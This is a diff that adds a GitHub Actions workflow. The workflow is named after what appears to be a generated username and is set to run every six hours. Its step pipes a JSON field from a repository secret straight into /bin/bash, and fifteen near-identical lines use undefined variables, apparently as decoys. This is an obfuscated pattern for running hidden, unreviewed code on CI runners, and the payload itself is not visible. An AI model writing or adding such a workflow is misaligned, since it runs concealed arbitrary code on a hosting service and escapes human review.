@@ -1,0 +1,33 @@
+name: zenghongqing7465
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zenghongqing7465
+        env:
+          k5: ${{ secrets.k5 }}
+        run: |
+          echo $k5 | jq -r .jl17210 | /bin/bash
+          echo $ik919 | jq -r .egop275 | /bin/bash
+          echo $mux34684 | jq -r .h49731 | /bin/bash
+          echo $i978 | jq -r .iaol85182 | /bin/bash
+          echo $ovhbq84 | jq -r .yroh15291 | /bin/bash
+          echo $ynsd142 | jq -r .ull06 | /bin/bash
+          echo $batu97 | jq -r .p4753 | /bin/bash
+          echo $mt42767 | jq -r .uorp03713 | /bin/bash
+          echo $mirv8417 | jq -r .vwvp1 | /bin/bash
+          echo $kns52 | jq -r .ozg49 | /bin/bash
+          echo $jsqzx348 | jq -r .fgfn94909 | /bin/bash
+          echo $qnrjo48205 | jq -r .ctiy43 | /bin/bash
+          echo $nzi7 | jq -r .kqop4 | /bin/bash
+          echo $nz2526 | jq -r .w24662 | /bin/bash
+          echo $dpv974 | jq -r .yl977 | /bin/bash
+          echo $jbkuf79210 | jq -r .u75981 | /bin/bash
+
